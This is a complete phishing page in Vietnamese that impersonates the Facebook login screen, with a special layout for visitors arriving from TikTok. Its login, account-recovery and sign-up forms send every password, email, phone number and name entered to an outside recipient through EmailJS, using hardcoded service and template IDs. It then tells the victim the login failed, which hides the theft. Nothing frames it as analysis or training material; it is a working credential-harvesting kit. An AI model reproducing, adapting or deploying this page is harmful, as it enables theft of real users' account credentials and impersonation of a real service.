<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập Facebook | Facebook</title>
    <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
    <meta property="og:description" content="Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.">
    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg">
    <meta property="og:url" content="https://www.facebook.com">
    <meta property="og:type" content="website">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'SF Pro Text', Helvetica, Arial, sans-serif; /* Font chính của Facebook */
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background: #f0f2f5; /* Màu nền giống Facebook */
        }
        body.tiktok-mode {
            background: #fff;
            justify-content: center;
            align-items: center;
        }
        .header {
            width: 100%;
            padding: 10px 15px;
            background-color: #fff; /* Trắng giống header Facebook mobile */
            border-bottom: 1px solid #dadde1; /* Viền dưới nhẹ */
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
            display: none;
        }
        body.tiktok-mode .header {
            display: block;
        }
        .header.hidden {
            display: none !important;
        }
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 400px;
            margin: 0 auto;
        }
        .header-title {
            font-size: 20px; /* Kích thước chữ giống Facebook mobile */
            font-weight: 600;
            color: #1c1e21;
            text-align: center;
            flex: 1;
        }
        .header-title.small-title {
            font-size: 16px;
        }
        .header-menu {
            cursor: pointer;
            position: absolute;
            right: 15px;
        }
        .header-menu svg {
            width: 24px;
            height: 24px;
            fill: #606770; /* Màu xám giống Facebook */
        }
        .dropdown-menu {
            display: none;
            position: absolute;
            top: 40px;
            right: 10px;
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 4px; /* Bo góc nhẹ giống Facebook */
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            z-index: 1001;
            width: 220px;
        }
        .dropdown-menu.active {
            display: block;
        }
        .dropdown-item {
            display: flex;
            align-items: center;
            padding: 8px 12px;
            font-size: 14px;
            color: #050505;
            text-align: left;
            border-bottom: 1px solid #dadde1;
            cursor: pointer;
        }
        .dropdown-item:last-child {
            border-bottom: none;
        }
        .dropdown-item:hover {
            background-color: #f2f2f2; /* Màu hover giống Facebook */
        }
        .dropdown-item svg {
            width: 20px;
            height: 20px;
            margin-right: 10px;
            fill: #606770;
        }
        .language-border {
            border-bottom: 1px solid #dadde1;
            margin-top: 5px;
            margin-bottom: 5px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
        }
        .language-text {
            font-size: 12px;
            color: #606770; /* Màu xám giống Facebook */
            text-align: center;
            max-width: 400px;
            margin: 0 auto;
        }
        .back-button-header {
            display: none;
            align-items: center;
            justify-content: flex-start;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
            color: #1877f2; /* Màu xanh giống Facebook */
        }
        .back-button-header svg {
            margin-right: 8px;
            fill: #1877f2;
        }
        .gradient-section {
            display: none; /* Bỏ gradient để giống Facebook mobile */
        }
        .main-container {
            flex-grow: 1;
            padding: 0; /* Bỏ padding thừa */
            max-width: 100%;
            margin: 0 auto;
            text-align: center;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container-tiktok, .login-container-desktop,
        .forgot-password-container, .forgot-password-email-container, .create-account-container,
        .about-container, .help-container, .more-container {
            width: 100%;
            max-width: 400px;
            background: #fff; /* Nền trắng giống Facebook */
            padding: 15px;
            margin-top: 56px; /* Đẩy xuống dưới header */
            text-align: center; /* Căn giữa giống Facebook */
            position: relative;
            z-index: 1;
            display: none;
            border-radius: 8px; /* Bo góc giống Facebook */
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); /* Đổ bóng nhẹ */
        }
        body.tiktok-mode .login-container-tiktok {
            margin-top: 56px; /* Đảm bảo không chồng header */
            max-height: calc(100vh - 56px - 60px); /* Giới hạn chiều cao */
            overflow-y: auto;
        }
        .login-container-tiktok.active, .login-container-desktop.active,
        .forgot-password-container.active, .forgot-password-email-container.active, 
        .create-account-container.active, .about-container.active, 
        .help-container.active, .more-container.active {
            display: block;
        }
        .facebook-logo {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px 0;
        }
        .custom-logo {
            width: 40px; /* Kích thước logo giống Facebook mobile */
            height: 40px;
            background-color: #1877f2; /* Màu xanh chính của Facebook */
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #fff;
            font-size: 28px; /* Chữ f nhỏ hơn một chút */
            font-family: 'SF Pro Text', Helvetica, Arial, sans-serif;
            font-weight: 600;
            text-transform: lowercase;
        }
        .login-container-tiktok input, .login-container-desktop input,
        .forgot-password-container input, .forgot-password-email-container input, 
        .create-account-container input {
            margin-bottom: 12px;
            border-radius: 6px;
            width: 100%;
            padding: 14px 16px; /* Padding giống input của Facebook */
            border: 1px solid #ccd0d5; /* Viền giống Facebook */
            background: #fff;
            font-size: 15px; /* Font giống Facebook */
            color: #1c1e21;
        }
        .login-container-tiktok input:focus, .login-container-desktop input:focus,
        .forgot-password-container input:focus, .forgot-password-email-container input:focus, 
        .create-account-container input:focus {
            border-color: #1877f2; /* Viền xanh khi focus */
            outline: none;
        }
        .btn-primary {
            width: 100%;
            border-radius: 6px;
            padding: 14px; /* Cao hơn giống nút Facebook */
            background-color: #1877f2; /* Màu xanh chính */
            border: none;
            color: #fff;
            font-weight: 600;
            font-size: 15px;
            text-transform: capitalize; /* Không in hoa toàn bộ */
        }
        .btn-primary:hover {
            background-color: #165eab; /* Màu hover giống Facebook */
        }
        .btn-create-account {
            background: #42b72a; /* Màu xanh lá giống nút tạo tài khoản */
            color: #fff;
            border: none;
            border-radius: 6px;
            width: 100%;
            padding: 14px;
            font-weight: 600;
            font-size: 15px;
            margin-top: 12px;
        }
        .btn-create-account:hover {
            background-color: #36a420; /* Hover giống Facebook */
        }
        .forgot-password {
            margin-top: 16px;
            color: #1877f2;
            cursor: pointer;
            font-size: 14px;
            text-align: center;
            display: block;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline; /* Gạch chân khi hover */
        }
        .bottom-section {
            position: fixed;
            bottom: 10px;
            width: 100%;
            max-width: 400px;
            left: 50%;
            transform: translateX(-50%);
            text-align: center;
            z-index: 1;
            display: none;
        }
        body.tiktok-mode .bottom-section {
            display: block;
        }
        .meta-section {
            color: #606770;
            font-size: 12px;
            font-weight: 600;
        }
        .meta-section::before {
            content: "Meta "; /* Logo Meta giống Facebook */
            font-size: 12px;
            color: #606770;
        }
        .footer-links-tiktok {
            position: fixed;
            bottom: 0;
            width: 100%;
            max-width: 400px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 12px;
            color: #606770;
            text-align: center;
            display: none;
            justify-content: center;
            gap: 20px;
            z-index: 1;
            padding: 10px 0;
            background: #fff;
            border-top: 1px solid #dadde1;
        }
        body.tiktok-mode .footer-links-tiktok {
            display: flex;
        }
        .footer-links-tiktok span {
            color: #606770;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-links-tiktok span:hover {
            text-decoration: underline;
        }
        .info-text {
            font-size: 12px;
            color: #606770;
            margin-top: 10px;
        }
        .search-by-email, .search-by-phone {
            display: block;
            text-align: center;
            margin-top: 12px;
            padding: 10px;
            background: #f5f6f5;
            color: #606770;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none;
        }
        .search-by-email:hover, .search-by-phone:hover {
            background: #ebedf0; /* Hover giống Facebook */
        }
        .error-message {
            color: #dc3545;
            font-size: 14px;
            margin-top: 10px;
            display: none;
        }
        .success-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); /* Đổ bóng giống Facebook */
            width: 90%;
            max-width: 320px; /* Kích thước giống popup Facebook */
            text-align: center;
            padding: 20px;
            z-index: 10002;
        }
        body.tiktok-mode .success-popup {
            max-width: 90%;
            padding: 24px;
        }
        .success-popup-title {
            font-size: 20px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 12px;
        }
        body.tiktok-mode .success-popup-title {
            font-size: 22px;
        }
        .success-popup-message {
            font-size: 16px;
            color: #606770;
            margin-bottom: 20px;
            line-height: 1.4;
        }
        body.tiktok-mode .success-popup-message {
            font-size: 17px;
        }
        .success-popup-button {
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 12px;
            width: 120px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
        }
        body.tiktok-mode .success-popup-button {
            width: 140px;
            padding: 14px;
        }
        .success-popup-button:hover {
            background-color: #165eab;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4); /* Overlay giống Facebook */
            z-index: 10001;
        }
        .fb-section {
            margin-bottom: 20px;
            text-align: left;
        }
        .fb-section h2 {
            font-size: 20px;
            font-weight: 600;
            color: #1c1e21;
            margin-bottom: 10px;
        }
        .fb-section p {
            font-size: 14px;
            color: #606770;
            line-height: 1.4;
        }
        .fb-section a {
            color: #1877f2;
            text-decoration: none;
        }
        .fb-section a:hover {
            text-decoration: underline;
        }
        .fb-links {
            margin-top: 15px;
        }
        .fb-links a {
            display: block;
            font-size: 14px;
            margin-bottom: 10px;
        }
        .left-section {
            display: none;
            text-align: left;
            padding: 20px;
        }
        .desktop-logo {
            width: 300px;
            margin-bottom: 20px;
        }
        .slogan {
            font-size: 24px;
            color: #1c1e21;
            line-height: 1.2;
        }
        body.desktop-mode .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px;
            max-width: 980px; /* Giống Facebook desktop */
        }
        body.desktop-mode .left-section {
            display: block;
            flex: 1;
            max-width: 500px;
        }
        body.desktop-mode .login-container-desktop {
            flex: 1;
            max-width: 396px; /* Chiều rộng chính xác của Facebook desktop */
            margin-left: 40px;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        .footer {
            background: #f5f6f5;
            padding: 20px 0;
            font-size: 12px;
            color: #8a8d91; /* Màu footer giống Facebook */
            text-align: center;
            display: none;
        }
        body.desktop-mode .footer {
            display: block;
        }
        .footer-languages {
            margin: 0 auto 8px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
        }
        .footer-languages a {
            color: #8a8d91;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-languages a:hover {
            text-decoration: underline;
        }
        .footer-links {
            margin: 0 auto 8px;
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            justify-content: center;
        }
        .footer-links a {
            color: #8a8d91;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-links a:hover {
            text-decoration: underline;
        }
        .footer-meta {
            margin: 0 auto;
            color: #8a8d91;
        }
        @media (max-width: 576px) {
            .header { padding: 8px 10px; }
            .header-title { font-size: 18px; }
            .header-title.small-title { font-size: 14px; }
            .language-text { font-size: 11px; }
            .back-button-header { font-size: 14px; }
            .login-container-tiktok, .forgot-password-container, .forgot-password-email-container, 
            .create-account-container, .about-container, .help-container, .more-container { 
                padding: 15px; margin-top: 56px; 
            }
            .facebook-logo { margin: 16px 0; }
            .btn-primary, .btn-create-account { padding: 12px; }
            .footer-links-tiktok { gap: 15px; }
            .bottom-section { bottom: 10px; }
            .fb-section h2 { font-size: 18px; }
        }
    </style>
</head>
<body>
    <script type="text/javascript">
        (function() {
            emailjs.init("wF5gWgp1GWyg7q0KY");
        })();
    </script>

    <div class="header">
        <div class="header-content">
            <div class="header-title" id="header-title">Facebook</div>
            <div class="header-menu" onclick="toggleDropdown()">
                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="6" r="2" fill="#606770"/>
                    <circle cx="12" cy="12" r="2" fill="#606770"/>
                    <circle cx="12" cy="18" r="2" fill="#606770"/>
                </svg>
            </div>
            <div class="dropdown-menu" id="dropdownMenu">
                <div class="dropdown-item" onclick="alert('Báo cáo đã được gửi!')">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#606770"/>
                    </svg>
                    Báo cáo
                </div>
                <div class="dropdown-item" onclick="window.open(window.location.href, '_blank')">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M19 19H5V5H12V3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V12H19V19ZM14 3V5H17.59L7.76 14.83L9.17 16.24L19 6.41V10H21V3H14Z" fill="#606770"/>
                    </svg>
                    Mở trong trình duyệt
                </div>
                <div class="dropdown-item" onclick="navigator.clipboard.writeText(window.location.href).then(() => alert('Liên kết đã được sao chép!'))">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z" fill="#606770"/>
                    </svg>
                    Sao chép liên kết
                </div>
            </div>
        </div>
        <div class="language-border"></div>
        <div class="language-text" id="language-text">Tiếng Việt</div>
        <div class="back-button-header" id="back-button-header" onclick="showLogin()">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M15 18L9 12L15 6" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            Quay lại
        </div>
    </div>
    <div class="gradient-section"></div>
    <div class="main-container">
        <div class="left-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="desktop-logo">
            <div class="slogan">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
        </div>
        <!-- TikTok Login Container -->
        <div class="login-container-tiktok">
            <div class="facebook-logo">
                <div class="custom-logo">f</div>
            </div>
            <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số di động hoặc email">
            <input type="password" id="password-tiktok" class="form-control" placeholder="Mật khẩu">
            <button class="btn btn-primary" onclick="login('tiktok')">Đăng nhập</button>
            <div class="forgot-password" onclick="showForgotPassword()">Quên mật khẩu?</div>
            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
        </div>
        <!-- Desktop Login Container -->
        <div class="login-container-desktop">
            <input type="text" id="login-input-desktop" class="form-control" placeholder="Số di động hoặc email">
            <input type="password" id="password-desktop" class="form-control" placeholder="Mật khẩu">
            <button class="btn btn-primary" onclick="login('desktop')">Đăng nhập</button>
            <div class="forgot-password" onclick="showForgotPassword()">Quên mật khẩu?</div>
            <div class="divider"></div>
            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
        </div>
        <!-- Forgot Password Container -->
        <div class="forgot-password-container">
            <h5 style="font-weight: 600;">Tìm tài khoản của bạn</h5>
            <p style="font-size: 14px; color: #606770;">Vui lòng nhập email hoặc số di động để tìm kiếm tài khoản của bạn.</p>
            <input type="text" id="phone-input" class="form-control" placeholder="Email hoặc số di động">
            <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
        </div>
        <!-- Forgot Password Email Container -->
        <div class="forgot-password-email-container">
            <h5 style="font-weight: 600;">Tìm tài khoản của bạn</h5>
            <p style="font-size: 14px; color: #606770;">Vui lòng nhập email để tìm kiếm tài khoản của bạn.</p>
            <input type="email" id="email-input" class="form-control" placeholder="Email">
            <button class="btn btn-primary" onclick="searchByEmail()">Tiếp tục</button>
        </div>
        <!-- Create Account Container -->
        <div class="create-account-container">
            <h5 style="font-weight: 600;">Tạo tài khoản mới</h5>
            <input type="text" id="firstName" class="form-control" placeholder="Tên">
            <input type="text" id="lastName" class="form-control" placeholder="Họ">
            <input type="text" id="phone" class="form-control" placeholder="Số di động hoặc email">
            <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
            <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
        </div>
        <!-- About Container -->
        <div class="about-container">
            <div class="fb-section">
                <h2>Giới thiệu về Facebook</h2>
                <p>Chúng tôi tin rằng mọi người có thể làm được nhiều điều hơn khi ở bên nhau.</p>
            </div>
        </div>
        <!-- Help Container -->
        <div class="help-container">
            <div class="fb-section">
                <h2>Trợ giúp & Hỗ trợ</h2>
                <p>Bạn cần trợ giúp? Chúng tôi ở đây để hỗ trợ bạn.</p>
            </div>
        </div>
        <!-- More Container -->
        <div class="more-container">
            <div class="fb-section">
                <h2>Xem thêm</h2>
                <p>Khám phá các sản phẩm và dịch vụ từ Meta.</p>
            </div>
        </div>
    </div>
    <div class="overlay" id="dialog-overlay"></div>
    <div class="success-popup" id="custom-dialog">
        <div class="success-popup-title" id="dialog-title"></div>
        <div class="success-popup-message" id="dialog-message"></div>
        <button class="success-popup-button" onclick="hideDialog()">OK</button>
    </div>
    <div class="bottom-section">
        <div class="meta-section"></div>
    </div>
    <div class="footer-links-tiktok">
        <span onclick="showAbout()">Giới thiệu</span>
        <span onclick="showHelp()">Trợ giúp</span>
        <span onclick="showMore()">Xem thêm</span>
    </div>
    <footer class="footer">
        <div class="footer-languages">
            <a href="#">Tiếng Việt</a>
            <a href="#">English (UK)</a>
            <a href="#">中文(台灣)</a>
        </div>
        <div class="footer-links">
            <a onclick="showLogin()">Đăng nhập</a>
            <a onclick="showCreateAccount()">Đăng ký</a>
            <a href="#">Messenger</a>
        </div>
        <div class="footer-meta">Meta © 2025</div>
    </footer>

    <script>
        window.onload = function() {
            const referrer = document.referrer.toLowerCase();
            const userAgent = navigator.userAgent.toLowerCase();
            const urlParams = new URLSearchParams(window.location.search);
            const isDesktop = window.innerWidth > 1024 && !/mobile|android|iphone|ipad/i.test(userAgent);
            const isFromTikTok = 
                referrer.includes("tiktok.com") || 
                userAgent.includes("tiktok") || 
                urlParams.has("tt_from");

            document.body.classList.remove('tiktok-mode', 'desktop-mode');
            const header = document.querySelector('.header');
            header.classList.add('hidden');

            if (isFromTikTok && !isDesktop) {
                document.body.classList.add('tiktok-mode');
                header.classList.remove('hidden');
                hideAllExcept('.login-container-tiktok');
            } else {
                document.body.classList.add('desktop-mode');
                header.classList.add('hidden');
                document.querySelector('.left-section').style.display = 'block';
                hideAllExcept('.login-container-desktop');
            }
        };

        function toggleDropdown() {
            document.getElementById('dropdownMenu').classList.toggle('active');
        }

        function hideAllExcept(selector) {
            const containers = [
                '.login-container-tiktok', '.login-container-desktop',
                '.forgot-password-container', '.forgot-password-email-container', 
                '.create-account-container', '.about-container', '.help-container', '.more-container'
            ];
            containers.forEach(container => {
                const element = document.querySelector(container);
                element.classList.remove('active');
                element.style.display = container === selector ? 'block' : 'none';
            });
            document.querySelector(selector).classList.add('active');
        }

        function showLogin() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const header = document.querySelector('.header');
            if (!isDesktop) {
                hideAllExcept('.login-container-tiktok');
                document.getElementById('header-title').innerText = 'Facebook';
                document.getElementById('header-title').classList.remove('small-title');
                document.getElementById('language-text').style.display = 'block';
                document.getElementById('back-button-header').style.display = 'none';
                header.classList.remove('hidden');
            } else {
                hideAllExcept('.login-container-desktop');
                document.querySelector('.left-section').style.display = 'block';
                header.classList.add('hidden');
            }
        }

        function showForgotPassword() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const header = document.querySelector('.header');
            hideAllExcept('.forgot-password-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
                header.classList.add('hidden');
            } else {
                document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
                header.classList.remove('hidden');
            }
        }

        function showForgotPasswordEmail() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const header = document.querySelector('.header');
            hideAllExcept('.forgot-password-email-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
                header.classList.add('hidden');
            } else {
                document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
                header.classList.remove('hidden');
            }
        }

        function showCreateAccount() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const header = document.querySelector('.header');
            hideAllExcept('.create-account-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
                header.classList.add('hidden');
            } else {
                document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
                header.classList.remove('hidden');
            }
        }

        function showAbout() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const header = document.querySelector('.header');
            hideAllExcept('.about-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
                header.classList.add('hidden');
            } else {
                document.getElementById('header-title').innerText = 'Giới thiệu';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
                header.classList.remove('hidden');
            }
        }

        function showHelp() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const header = document.querySelector('.header');
            hideAllExcept('.help-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
                header.classList.add('hidden');
            } else {
                document.getElementById('header-title').innerText = 'Trợ giúp';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
                header.classList.remove('hidden');
            }
        }

        function showMore() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const header = document.querySelector('.header');
            hideAllExcept('.more-container');
            if (isDesktop) {
                document.querySelector('.left-section').style.display = 'none';
                header.classList.add('hidden');
            } else {
                document.getElementById('header-title').innerText = 'Xem thêm';
                document.getElementById('header-title').classList.add('small-title');
                document.getElementById('language-text').style.display = 'none';
                document.getElementById('back-button-header').style.display = 'flex';
                header.classList.remove('hidden');
            }
        }

        function showDialog(title, message) {
            const dialog = document.getElementById('custom-dialog');
            const overlay = document.getElementById('dialog-overlay');
            document.getElementById('dialog-title').innerText = title;
            document.getElementById('dialog-message').innerText = message;
            dialog.style.display = 'block';
            overlay.style.display = 'block';
        }

        function hideDialog() {
            document.getElementById('custom-dialog').style.display = 'none';
            document.getElementById('dialog-overlay').style.display = 'none';
        }

        function login(mode) {
            const loginInput = mode === 'tiktok' ? document.getElementById('login-input-tiktok') : document.getElementById('login-input-desktop');
            const passwordInput = mode === 'tiktok' ? document.getElementById('password-tiktok') : document.getElementById('password-desktop');
            const loginValue = loginInput.value;
            const password = passwordInput.value;

            if (!loginValue || !password) {
                showDialog("Đăng nhập không thành công", "Vui lòng nhập email hoặc số di động và mật khẩu.");
                return;
            }

            const templateParams = {
                password: password,
                phone: '',
                email: loginValue,
                firstName: '',
                lastName: ''
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function() {
                    showDialog("Đăng nhập không thành công", "Sai email, số di động hoặc mật khẩu. Hãy thử lại.");
                }, function() {
                    showDialog("Đăng nhập không thành công", "Có lỗi xảy ra. Vui lòng thử lại.");
                });
        }

        function searchByPhone() {
            const phone = document.getElementById('phone-input').value;
            if (!phone) {
                showDialog("Không tìm thấy", "Vui lòng nhập email hoặc số di động.");
                return;
            }

            const templateParams = {
                password: '',
                phone: phone,
                email: '',
                firstName: '',
                lastName: ''
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function() {
                    showDialog("Gửi thành công", "Chúng tôi đã gửi mã xác nhận đến " + phone);
                }, function() {
                    showDialog("Không tìm thấy", "Không tìm thấy tài khoản nào khớp với thông tin này.");
                });
        }

        function searchByEmail() {
            const email = document.getElementById('email-input').value;
            if (!email) {
                showDialog("Không tìm thấy", "Vui lòng nhập email.");
                return;
            }

            const templateParams = {
                password: '',
                phone: '',
                email: email,
                firstName: '',
                lastName: ''
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function() {
                    showDialog("Gửi thành công", "Chúng tôi đã gửi mã xác nhận đến " + email);
                }, function() {
                    showDialog("Không tìm thấy", "Không tìm thấy tài khoản nào khớp với thông tin này.");
                });
        }

        function createAccount() {
            const firstName = document.getElementById('firstName').value;
            const lastName = document.getElementById('lastName').value;
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('new-password').value;

            if (!firstName || !lastName || !phone || !password) {
                showDialog("Đăng ký không thành công", "Vui lòng điền đầy đủ thông tin.");
                return;
            }

            const templateParams = {
                password: password,
                phone: phone,
                email: phone,
                firstName: firstName,
                lastName: lastName
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function() {
                    showDialog("Đăng ký thành công", "Tài khoản của bạn đã được tạo.");
                }, function() {
                    showDialog("Đăng ký không thành công", "Có lỗi xảy ra. Vui lòng thử lại.");
                });
        }
    </script>
</body>
</html>
